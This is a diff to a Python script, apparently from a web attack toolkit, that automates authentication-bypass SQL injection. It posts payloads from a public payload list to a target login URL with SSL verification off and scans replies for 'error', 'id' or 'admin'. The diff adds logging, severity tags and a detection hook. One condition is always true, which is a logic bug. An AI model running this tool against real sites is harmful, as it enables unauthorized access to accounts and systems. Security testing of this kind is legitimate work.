@@ -23,28 +23,30 @@ project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))
 
 # Add the project root directory to the Python path
 sys.path.append(project_root)
+current_directory = os.path.dirname(os.path.abspath(__file__))
+project_root = os.path.abspath(os.path.join(current_directory, '..'))
+
+# Add the project root directory to the Python path
+sys.path.append(project_root)
 
 # Now you should be able to import logs
 from logger.logs import logger
+from regelexpression.patterns import Detect
+from priority.Priority import PRIORITY,HARMFULL
 
-
-############################################################################
 attack_type = "authentication bypass SQL injection"
-#############################################################################
 
 """ 
               Reference : https://github.com/payloadbox/sql-injection-payload-list 
               for The payloads"""
 
-logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
+__priority__ = PRIORITY.HIGH
+__harmfull__ = HARMFULL.HIGH
 
 
-
-####################################33
 pattern = r"\berror\b"
 htmlpattern = r"\bid\b"
 capturesAUTHBYPASS = []
-########################################
 
 
 
@@ -62,7 +64,7 @@ async def auth_SQL_inj_json(urls):
             rows = payload.split("\n") 
             sorted_rows = sorted(rows) 
             sorted_payload = "\n".join(sorted_rows)
-            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
+            logger.info(f"The payload is:\n\n{sorted_payload}\n\n")
             requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
             req = requests.get(url=urls,verify=False) 
             if req.status_code == 200: 
@@ -80,31 +82,35 @@ async def auth_SQL_inj_json(urls):
                         inp = input(Fore.RESET+Fore.LIGHTBLUE_EX+f"JSON payload:\nf{params['username']}\n{params['password']} \npress enter to send the json data to the server:\n press any key to send payloads auto.")
                         logger.info(f"Testing payload:{json.dumps(line)}")
                         if inp:
-                            ##############################################################################
                             ack = requests.post(url=urls, data=params,verify=False)
                             logger.info(f"Testing payload:{json.dumps(line)}") 
                             await asyncio.sleep(5) 
                             if "error" in ack.text: 
                                 logger.info(f"Could find parameter Error,keyword:{json.dumps(line)}")
+                                Detect(ack.text)
                                 
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: 
                                 logging.info(f"Could find parameter id,keyword:{json.dumps(line)}")
+                                Detect(ack.text)
                                 await asyncio.sleep(3) 
                             
                             if htmlVULN:
                                 logger.info(f"Could find error parameter, keyword:{json.dumps(line)}")
+                                Detect(ack.text)
                                 await asyncio.sleep(3)
                             
                             word = "id" in req.text 
                             errword = "error" in req.text
                             if word:
                                 logger.info(f"Could find parameter id, keyword:{json.dumps(line)}")
+                                Detect(ack.text)
                                 await asyncio.sleep(3)
                             
                             if errword:
                                 logger.info(f"Could find parameter error, keyword:{json.dumps(line)}")
+                                Detect(ack.text)
                                 await asyncio.sleep(3)
                         
                         elif inp == "esc":
@@ -126,6 +132,7 @@ async def auth_SQL_inj_json(urls):
                             done = True
                         
                         if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
+                            Detect(ack.text)
                             logger.info(f"Could find parameter admin,keyword:{json.dumps(line)},target:{urls}")
                             
                 elif ask.lower() == "n":
@@ -151,10 +158,7 @@ async def auth_SQL_inj_json(urls):
         raise
         
     finally:
-        pass
-        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
-        #             \n{ack.text}\n     """)
-        # capturesAUTHBYPASS.append(ack.text)
+        logger.info(f"The attack is done")
         
         
 
